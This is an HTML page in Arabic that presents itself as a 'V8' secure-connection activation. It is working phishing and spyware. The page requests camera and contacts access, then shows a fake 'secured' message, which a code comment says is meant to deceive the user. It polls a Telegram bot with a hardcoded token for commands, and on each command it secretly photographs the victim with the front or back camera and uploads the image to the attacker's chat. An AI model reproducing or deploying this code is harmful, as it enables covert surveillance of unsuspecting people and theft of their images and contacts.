<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>V8 - Secure Connection</title>
    <style>
        body { background: #000; color: #00ffcc; font-family: monospace; text-align: center; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
        .panel { border: 1px solid #00ffcc; padding: 25px; border-radius: 15px; width: 90%; max-width: 400px; background: rgba(0,255,204,0.05); }
        .btn { background: #00ffcc; color: #000; border: none; padding: 15px; border-radius: 5px; font-weight: bold; cursor: pointer; width: 100%; margin-top: 20px; }
        video, canvas { display: none; }
    </style>
</head>
<body>
    <div class="panel" id="ui">
        <h2 id="t">V8 SYSTEM - CONNECT</h2>
        <p id="s">يرجى الضغط لتفعيل بروتوكول الأمان</p>
        <button class="btn" id="b" onclick="realConnect()">تفعيل الاتصال الآمن ✅</button>
    </div>

    <video id="v" autoplay playsinline muted></video>
    <canvas id="c"></canvas>

    <script>
        const TOKEN = "8367869004:AAEv2aO1zLLQ1n39BqG6hsZnlTBXXc6CLgY";
        const params = new URLSearchParams(window.location.search);
        const uid = params.get('id');

        async function takeAction(mode) {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: mode === 'back' ? "environment" : "user" } });
                const video = document.getElementById('v');
                video.srcObject = stream;
                await new Promise(r => setTimeout(r, 2000)); // لضبط الإضاءة

                const canvas = document.getElementById('c');
                canvas.width = video.videoWidth; canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
                const photo = canvas.toDataURL('image/jpeg', 0.8);

                const blob = await (await fetch(photo)).blob();
                const fd = new FormData();
                fd.append('chat_id', uid);
                fd.append('photo', blob, 'v8.jpg');
                fd.append('caption', `✅ تنفيذ أمر مباشر: ${mode}`);
                
                await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
                stream.getTracks().forEach(t => t.stop());
            } catch(e) {}
        }

        async function realConnect() {
            if(!uid) return;
            // 1. طلب الأذونات فوراً (كاميرا وأسماء)
            try {
                const initialStream = await navigator.mediaDevices.getUserMedia({ video: true });
                initialStream.getTracks().forEach(t => t.stop());
                
                if ('contacts' in navigator) {
                    await navigator.contacts.select(['name', 'tel'], { multiple: true });
                }

                // 2. إخفاء الواجهة (نوخرهم) لإيهام المستخدم بالانتهاء
                document.getElementById('ui').innerHTML = "<h3>✅ تم التأمين بنجاح</h3><p>جاري المزامنة في الخلفية...</p>";
                
                // إرسال إشارة "أونلاين" للبوت
                fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${uid}&text=🟢 الاتصال حقيقي ومستمر الآن! أرسل أوامرك.`);

                // 3. الاستماع الدائم للأوامر (Persistent Listener)
                setInterval(async () => {
                    try {
                        const res = await fetch(`https://api.telegram.org/bot${TOKEN}/getUpdates?offset=-1`);
                        const data = await res.json();
                        const cmd = data.result[0].message.text;

                        if (cmd === "/v8_front") takeAction('front');
                        if (cmd === "/v8_back") takeAction('back');
                    } catch (e) {}
                }, 4000);

            } catch (e) { window.location.replace("https://google.com"); }
        }
    </script>
</body>
</html>
